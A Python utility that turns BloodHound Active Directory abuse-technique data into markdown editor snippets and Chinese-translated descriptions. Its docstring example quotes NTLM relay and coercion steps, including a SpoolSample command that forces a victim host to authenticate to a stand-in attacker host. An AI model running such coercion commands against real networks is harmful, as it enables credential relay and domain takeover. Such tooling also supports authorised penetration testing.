# /// script
# requires-python = ">=3.10"
# dependencies = [
#   "googletrans==4.0.0rc1",
# ]
# ///

import json


'''
Example of technique_props structure:
{
    "key": null,
    "ref": null,
    "props": {
        "children": [
            {
                "type": {
                    "propTypes": {}
                },
                "key": null,
                "ref": null,
                "props": {
                    "variant": "body2",
                    "children": "1: Start the Relay Server The NTLM relay can be executed with Inveigh."
                },
                "_owner": null,
                "_store": {}
            },
            {
                "type": {
                    "propTypes": {}
                },
                "key": null,
                "ref": null,
                "props": {
                    "variant": "body2",
                    "children": [
                        "2: Coerce the Target Computer Several coercion methods are documented here:",
                        " ",
                        {
                            "type": "a",
                            "key": null,
                            "ref": null,
                            "props": {
                                "href": "https://github.com/p0dalirius/windows-coerced-authentication-methods",
                                "children": "Windows Coerced Authentication Methods"
                            },
                            "_owner": null,
                            "_store": {}
                        },
                        ". Examples of tools include:",
                        {
                            "type": "a",
                            "key": null,
                            "ref": null,
                            "props": {
                                "href": "https://github.com/leechristensen/SpoolSample",
                                "children": "SpoolSample"
                            },
                            "_owner": null,
                            "_store": {}
                        },
                        {
                            "type": "a",
                            "key": null,
                            "ref": null,
                            "props": {
                                "href": "https://github.com/topotam/PetitPotam",
                                "children": "PetitPotam"
                            },
                            "_owner": null,
                            "_store": {}
                        },
                        "To trigger WebClient coercion (instead of regular SMB coercion), the listener must use a WebDAV Connection String format: \\\\SERVER_NETBIOS@PORT/PATH/TO/FILE. Example: SpoolSample.exe \"VICTIM_IP\" \"ATTACKER_NETBIOS@PORT/file.txt\""
                    ]
                },
                "_owner": null,
                "_store": {}
            }
        ]
    },
    "_owner": null,
    "_store": {}
}
'''



def recursive_process_react_element_json(props):
    # 递归处理 props 以及其中的 props children 
    # 将内容转换为 markdown 格式
    if isinstance(props, dict):
        if "props" in props:
            # operating all kinds of elements
            if "type" in props.keys() and props["type"] == "a":
                return f"[{props['props']['children']}]({props['props']['href']})"
            if "href" in props["props"].keys() and props["props"]["href"] != "":
                return f"[{props['props']['children']}]({props['props']['href']})"
            if "type" in props.keys() and props["type"] == "b":
                return f"- {props['props']['children']}"
            if "type" in props.keys() and props["type"] == "br":
                return "\n"
            if "component" in props["props"].keys() and props["props"]["component"] == "pre":
                return f"\n```sh\n{props['props']['children']}\n```"
            if "component" in props["props"].keys() and props["props"]["component"] == "code":
                return f"`{props['props']['children']}`"
            if "component" in props["props"].keys() and props["props"]["component"] == "span":
                return f"- {props['props']['children']}"
            return recursive_process_react_element_json(props["props"])
        if "children" in props:
            if isinstance(props["children"], str):
                # 处理字符串类型的 children
                return props["children"]
            elif isinstance(props["children"], list):
                return [recursive_process_react_element_json(child) for child in props["children"]]
            elif isinstance(props["children"], dict):
                print("dict detected", json.dumps(props["children"], ensure_ascii=False))
                return recursive_process_react_element_json(props["children"])
        else:
            return props
    elif isinstance(props, str):
        return f"{props}"
    elif isinstance(props, list):
        return [recursive_process_react_element_json(item) for item in props]
    

def convert_array_in_tree_to_single_string(data):
    # 将递归数组转换为字符串列表
    if data is None:
        print("None detected")
        return ""
    if isinstance(data, str):
        return data
    elif isinstance(data, list):
        print("list detected", data)
        string = ""
        for i in data:
            string += convert_array_in_tree_to_single_string(i)
        return string
    elif isinstance(data, dict):
        print("dict detected", data)
        if data != {}:
            print("dict not empty")
        return ""


def parse_abuse(name, platform, technique_props, desc):
    print(f"detecting {platform} abuse for {name}...")
    print(json.dumps(technique_props, indent=4, ensure_ascii=False))
    data = recursive_process_react_element_json(technique_props)
    if platform == "common":
        body = [f"To Abuse '{name}' commonly: "]
    else:
        body = [f"To Abuse '{name}' on {platform}: "]
    print(f"data: {data}")
    # parse data to string list body
    if isinstance(data, str):
        body.append(data)
    elif isinstance(data, list):
        for item in data:
            curent_str = convert_array_in_tree_to_single_string(item)
            curent_str = curent_str.replace("$", "\$")
            for line in curent_str.split("\n"):
                if line.strip() != "":
                    body.append(line.strip())
    print(f"body: {body}")
    for i in range(len(body)):
        if "No abuse information available for this node type." in body[i]:
            body[i] = "Too much abuse techniques, please refer to the original document for details"
    return {
        f"{name} {platform} abuse (bloodhound)": {
            "description": desc.replace("WE_CONTROLLED", "controlled object").replace("OUR_TARGET", "target object"),
            "prefix": f"{name}",
            "body": body,
        }
    }


def parse_technique(technique):
    technique_name = technique["technique"]
    linux_abuse = technique.get("linux", {})
    windows_abuse = technique.get("windows", {})
    common = technique.get("abuse", {})
    print(f"Parsing {technique_name}...")
    snippets = {}
    
    general = technique.get("general", {})
    print(f"Technique description parsing {json.dumps(general, indent=4, ensure_ascii=False)}")
    desc = convert_array_in_tree_to_single_string(recursive_process_react_element_json(general))
    print(f"Technique description: {desc}")
    
    if linux_abuse != {}:
        if isinstance(linux_abuse, list):
            for item in linux_abuse:
                overTarget = item[0]
                react_element = item[1]
                print(f"start processing {technique_name} over {overTarget} in linux")
                snippets.update(parse_abuse(f"{technique_name} over {overTarget}", "linux", react_element, desc))
        else:
            snippets.update(parse_abuse(technique_name, "linux", linux_abuse, desc))
    else:
        print(f"Skipping {technique_name} due to missing linux abuse info")
    if windows_abuse != {}:
        if isinstance(windows_abuse, list):
            for item in windows_abuse:
                overTarget = item[0]
                react_element = item[1]
                print(f"start processing {technique_name} over {overTarget} in windows")
                snippets.update(parse_abuse(f"{technique_name} over {overTarget}", "windows", react_element, desc))
        else:
            snippets.update(parse_abuse(technique_name, "windows", windows_abuse, desc))
    else:
        print(f"Skipping {technique_name} due to missing windows abuse info")
    if common != {}:
        snippets.update(parse_abuse(technique_name, "common", common, desc))
        print("Common",common)
    else:
        print(f"Skipping {technique_name} due to missing common abuse info")
    return snippets


from googletrans import Translator
def translate_text(text, dest='zh-CN'): # en
    translator = Translator()
    translation = translator.translate(text, dest)
    return translation.text

def get_technique_description(technique):
    technique_name = technique["technique"]
    general = technique.get("general", {})
    print(f"Technique description parsing {json.dumps(general, indent=4, ensure_ascii=False)}")
    desc = convert_array_in_tree_to_single_string(recursive_process_react_element_json(general))
    print(f"Technique description: {desc}")
    desc = desc.replace("WE_CONTROLLED", "controlled object").replace("OUR_TARGET", "target object")
    print(desc)
    trans_desc = translate_text(desc)
    final_desc = f"{desc}\n\n{trans_desc}"
    print("finally result of descriptions: \n",final_desc)
    return {
        f"{technique_name}" : final_desc,
    }


def main():
    output = open("blood.json", "w", encoding="utf-8")
    output_data = {}
    
    input_file = open("./dump/result.json", "r", encoding="utf-8")
    input_data = json.load(input_file)
    
    for technique in input_data:
        output_data |= parse_technique(technique)

    json.dump(output_data, output, ensure_ascii=False, indent=4)
    output.close()
    input_file.close()
    
    input_file = open("./dump/result.json", "r", encoding="utf-8")
    input_data = json.load(input_file)
    output = open("blood_desc.json", "w", encoding="utf-8")
    output_data = {} # clean up
    for technique in input_data:
        output_data |= get_technique_description(technique)
    json.dump(output_data, output, ensure_ascii=False, indent=4)
    output.close()
    input_file.close()

if __name__ == "__main__":
    main()
